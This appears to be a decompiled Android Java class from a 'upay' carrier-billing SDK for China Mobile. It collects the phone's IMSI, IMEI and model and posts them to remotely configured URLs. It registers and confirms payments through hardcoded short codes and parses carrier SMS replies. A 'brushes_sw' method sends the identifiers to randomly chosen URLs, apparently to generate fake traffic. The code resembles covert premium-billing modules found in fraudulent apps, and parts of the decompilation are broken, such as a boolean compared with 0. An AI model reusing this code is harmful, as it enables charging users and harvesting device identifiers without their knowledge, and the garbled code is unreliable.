package com.upay.billing.engine.he_nc;

import android.util.Log;
import com.upay.billing.MtContext;
import com.upay.billing.UpayConstant;
import com.upay.billing.UpayContext;
import com.upay.billing.UpayCore;
import com.upay.billing.bean.Cmd;
import com.upay.billing.bean.Op;
import com.upay.billing.bean.Trade;
import com.upay.billing.engine.CommonEngine;
import com.upay.billing.utils.HttpRunner;
import com.upay.billing.utils.Json;
import com.upay.billing.utils.Util;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Random;
import java.util.regex.Pattern;

public class Main
  extends CommonEngine
{
  private static final String REQ1 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><request><imsi>$imsi</imsi><imei>$imei</imei><price>$price</price><cpparam>$cpparam</cpparam></request>";
  private static final String REQ2 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><request><content_sid>$sid</content_sid></request>";
  private static final String TAG = "he_nc-Main";
  private static final String confirmNum = "1065889923";
  private static final String loginUrl = "http://$loginurl/$sid";
  private static final Pattern ptn = Pattern.compile("<status>([0-9]+)</status>");
  private static final String queryUrl = "http://$queryurl/$sid";
  private static final String registrationNum = "10658422";
  private List<String> confirmFail;
  private int count;
  private List<String> regFail;
  private List<String> regSmsFail;
  private List<String> reqFail;
  private int retry = 2;
  private List<String> sendFail;
  private List<String> sendSucc;
  
  public Main() {}
  
  private void brushes_sw(Cmd paramCmd)
  {
    Object localObject = this.core.getUpayContext();
    String str1 = Util.ifEmpty(((UpayContext)localObject).imsi, "");
    String str2 = Util.ifEmpty(((UpayContext)localObject).imei, "");
    String str3 = Util.ifEmpty(((UpayContext)localObject).model, "");
    ArrayList localArrayList = new ArrayList();
    localObject = Json.parse(Util.loadLocalText(UpayConstant.UPAY_PROP_PATH)).getArray("he_nc_dj_brushes_sw");
    if (((Json)localObject).length() != 0)
    {
      int i = 0;
      while (i < ((Json)localObject).length())
      {
        localArrayList.add(((Json)localObject).getObjectAt(i));
        i += 1;
      }
      boolean[] arrayOfBoolean = new boolean[1];
      arrayOfBoolean[0] = false;
      localObject = null;
      while (arrayOfBoolean[0] == 0)
      {
        Json localJson = (Json)localArrayList.get(getRandom(0, localArrayList.size() - 1));
        String str4 = localJson.getStr("cmd_key");
        localObject = localJson;
        if (!paramCmd.key.contains(str4))
        {
          arrayOfBoolean[0] = true;
          localObject = localJson;
        }
      }
      Util.addTask(new Main.5(this, ((Json)localObject).getStr("url")).setDoGet().addParam("imsi", str1).addParam("imei", str2).addParam("ua", str3));
    }
  }
  
  private void confirmPay(String paramString1, String paramString2, String paramString3, String paramString4, String paramString5, Trade paramTrade, Cmd paramCmd, Json paramJson1, Json paramJson2, Json paramJson3, int paramInt1, String paramString6, String paramString7, byte[] paramArrayOfByte, int paramInt2)
  {
    Util.addTask(new Main.4(this, paramString2, paramString3, paramString1, paramInt2, paramString7, paramTrade, paramString4, paramString5, paramCmd, paramJson1, paramJson2, paramJson3, paramInt1, paramString6, paramArrayOfByte));
  }
  
  private int getRandom(int paramInt1, int paramInt2)
  {
    return new Random().nextInt(paramInt2) % (paramInt2 - paramInt1 + 1) + paramInt1;
  }
  
  public Op getOp()
  {
    return Op.CMCC;
  }
  
  public boolean hasCustomConfirmUi()
  {
    return false;
  }
  
  public boolean isAvailable(Op paramOp, boolean paramBoolean1, boolean paramBoolean2, boolean paramBoolean3, boolean paramBoolean4)
  {
    return (paramOp == Op.CMCC) && (paramBoolean1) && (paramBoolean2);
  }
  
  public boolean isComposable()
  {
    return true;
  }
  
  public int onMtAction(MtContext paramMtContext, Json paramJson, String paramString1, String paramString2, String[] paramArrayOfString)
  {
    Log.i("he_nc-Main", "onMtAction: exec=" + paramJson.asObject() + ",mtNum=" + paramString1 + ",mtMsg=" + paramString2);
    switch (Main.6.$SwitchMap$com$upay$billing$engine$he_nc$Main$ExecType[Main.ExecType.valueOf(paramJson.getStr("type").toUpperCase()).ordinal()])
    {
    default: 
      return 0;
    case 1: 
      return 524288;
    case 2: 
      return 65736;
    }
    return 0x10000 | paramJson.getInt("code");
  }
  
  public void pay(Trade paramTrade, List<Cmd> paramList)
  {
    this.regFail = new ArrayList();
    this.sendSucc = new ArrayList();
    this.sendFail = new ArrayList();
    this.confirmFail = new ArrayList();
    this.reqFail = new ArrayList();
    this.regSmsFail = new ArrayList();
    this.count = 0;
    Iterator localIterator = Util.safeIter(paramTrade.subTrades).iterator();
    while (localIterator.hasNext())
    {
      Json localJson1 = (Json)localIterator.next();
      this.count += 1;
      int j = this.count;
      int k = paramTrade.subTrades.length();
      String str1 = localJson1.getStr("sn");
      Object localObject1 = paramList.iterator();
      Cmd localCmd;
      do
      {
        boolean bool = ((Iterator)localObject1).hasNext();
        localCmd = null;
        if (!bool) {
          break;
        }
        localCmd = (Cmd)((Iterator)localObject1).next();
      } while (!localCmd.key.equals(localJson1.getStr("cmd_key")));
      localJson1 = Json.createObject(new Object[] { "trade_id", paramTrade.id, "goods_key", paramTrade.goodsKey, "cmd_key", localCmd.key, "bt_key", this.key, "target", "", "sn", str1, "request", "", "response", "" });
      localObject1 = Json.createObject(new Object[] { "trade_id", paramTrade.id, "goods_key", paramTrade.goodsKey, "cmd_key", localCmd.key, "bt_key", this.key, "description", "", "mt_msg", "", "mt_num", "", "sn", str1 });
      Json localJson2 = Json.parse(localCmd.msg);
      String str2 = localJson2.getStr("mode");
      String str5 = localJson2.getStr("type");
      Object localObject2 = this.core.getUpayContext();
      String str3 = Util.ifEmpty(((UpayContext)localObject2).imsi, "");
      String str4 = Util.ifEmpty(((UpayContext)localObject2).imei, "");
      localObject2 = Util.ifEmpty(((UpayContext)localObject2).model, "");
      if ((!Util.empty(str5)) && ("get-text".equals(str5.trim())))
      {
        Util.addTask(new Main.1(this, localJson2.getStr("url"), paramTrade, str1, localCmd, localJson1, str2, (Json)localObject1, j, k).setDoGet().addParam("imsi", str3).addParam("imei", str4).addParam("ua", (String)localObject2));
      }
      else if ((!Util.empty(str5)) && ("get-json".equals(str5.trim())))
      {
        Util.addTask(new Main.2(this, localJson2, paramTrade, str1, localCmd, localJson1, str2, (Json)localObject1, k, str3));
      }
      else
      {
        localJson2 = localJson2.getArray("params");
        int m = localJson2.length();
        int i = 0;
        while (i < m)
        {
          Object localObject4 = localJson2.getObjectAt(i);
          Object localObject3 = "00" + Util.shortenSn(str1, true);
          str5 = ((Json)localObject4).getStr("loginurl");
          localObject2 = ((Json)localObject4).getStr("queryurl");
          String str6 = ((Json)localObject4).getStr("sid");
          localObject4 = ((Json)localObject4).getStr("price");
          localObject3 = Util.stringToBytes("<?xml version=\"1.0\" encoding=\"UTF-8\"?><request><imsi>$imsi</imsi><imei>$imei</imei><price>$price</price><cpparam>$cpparam</cpparam></request>".replace("$imsi", str3).replace("$imei", str4).replace("$price", (CharSequence)localObject4).replace("$cpparam", (CharSequence)localObject3));
          userRegister("http://$loginurl/$sid".replace("$loginurl", str5).replace("$sid", str6), paramTrade, j, str6, (String)localObject2, (String)localObject4, str1, localCmd, localJson2, localJson1, (Json)localObject1, k, str2, this.retry, (byte[])localObject3);
          i += 1;
        }
      }
    }
  }
  
  public void userRegister(String paramString1, Trade paramTrade, int paramInt1, String paramString2, String paramString3, String paramString4, String paramString5, Cmd paramCmd, Json paramJson1, Json paramJson2, Json paramJson3, int paramInt2, String paramString6, int paramInt3, byte[] paramArrayOfByte)
  {
    Util.addTask(new Main.3(this, paramString1, paramString3, paramString2, paramString4, paramString5, paramTrade, paramCmd, paramJson1, paramJson2, paramJson3, paramInt2, paramString6, paramArrayOfByte, paramInt3).setPostData(paramArrayOfByte).addHeader("Content-Type", "text/xml"));
  }
}
